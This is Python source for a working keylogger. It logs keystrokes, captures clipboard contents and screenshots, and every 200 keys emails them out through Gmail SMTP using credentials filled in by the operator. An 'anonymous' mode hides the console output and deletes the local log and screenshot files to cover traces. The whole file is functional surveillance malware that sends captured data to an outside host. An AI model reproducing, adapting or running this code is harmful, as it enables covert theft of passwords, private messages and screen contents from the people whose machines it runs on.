# TO handles os related operation
import os
# To listen keyboard
from pynput import keyboard
# To send emails
import smtplib
# To write, and send simple email messages, as well as more complex MIME messages.
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
# To check internet connection
import socket
# To take screenshots
import autopy
# To get clipboard content
import clipboard

# stores each keystroke
key_logs = []

email_id = 'ENTER YOU EMAIL HERE'
password = 'ENTER YOU PASSWORD HERE'
subject = "At your service."

# if anonymous don't print logs, deletes local logs, ss, send email only
IS_ANONYMOUS = False


def is_internet_connected() -> bool:
    """
    check if connected to internet or not
    """
    return socket.gethostbyname(socket.gethostname()) != '127.0.0.1'


def key_press_handler(key):
    """
    method to handle
    """
    global key_logs, IS_ANONYMOUS

    # prints logs in console
    if not IS_ANONYMOUS:
        try:
            print('alphanumeric key {0} pressed'.format(key.char))
        except AttributeError:
            print('special key {0} pressed'.format(key))

    # remove ' from key stroke
    key = str(key).replace("'", "")

    if key == "Key.backspace" and len(key_logs) != 0:
        key_logs.pop()
    else:
        key_logs.append(key)

    # calls save_data() after every given key-strokes to take actions
    if len(key_logs) > 0 and len(key_logs) % 200 == 0:
        save_data(key_logs)


def save_data(logs):
    """
    save data locally and send an email
    """
    message = ''
    # format the key-strokes
    for key in logs:
        if key.find("space") > 0:
            message += ' '
        elif key.find("enter") > 0:
            message += '\n'
        elif key.find("Key") == -1:
            message += key

    clipboard_text = get_clipboard()
    make_local_logs(message, clipboard_text)
    send_mail(message, clipboard_text)
    # key_logs.clear()

    # delete local logs if anonymous
    if IS_ANONYMOUS:
        try:
            os.remove('ss.png')
            os.remove('logs.txt')
        finally:
            pass


def make_local_logs(message: str, copied_text: str):
    """
    create a log.txt file
    """
    with open('logs.txt', 'a') as my_file:
        my_file.write(message)
        my_file.write('\n' + copied_text + '\n\n')


def send_mail(message: str, clipboard_text: str):
    """
    send an email on given email with key logs, clipboard text and screenshots

    NOTE: To login into a gmail account, you will have to enable 'allow less secure apps'
    by this link https://support.google.com/accounts/answer/6010255
    """
    global email_id, password, subject

    if is_internet_connected():
        email_message = MIMEMultipart()
        email_message['Subject'] = subject

        # attach message
        email_message.attach(
            MIMEText("Key-strokes Text:\n" + message, "plain"))
        email_message.attach(
            MIMEText("\n\nClipboard Text:\n" + clipboard_text, "plain"))
        take_screenshot()
        filename = "ss.png"
        # Open file in binary mode
        with open(filename, "rb") as attachment:
            # Add file as application/octet-stream
            mbase = MIMEBase("application", "octet-stream")
            mbase.set_payload(attachment.read())

            # Encode file in ASCII characters to send
            encoders.encode_base64(mbase)

            mbase.add_header(
                "Content-Disposition",
                f"attachment; filename= {filename}",
            )
        email_message.attach(mbase)

        # Convert into a string
        email_message_str = email_message.as_string()
        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.starttls()
        smtp.login(email_id, password)
        smtp.sendmail(email_id, email_id, email_message_str)
    else:
        print("Oops! Not connected to internet")


def take_screenshot():
    """
    takes screenshot
    """
    autopy.bitmap.capture_screen().save('ss.png')


def get_clipboard() -> str:
    """
    returns current clipboard content
    """
    return clipboard.paste()


if __name__ == '__main__':
    with keyboard.Listener(
            on_press=key_press_handler,
    ) as listener:
        listener.join()
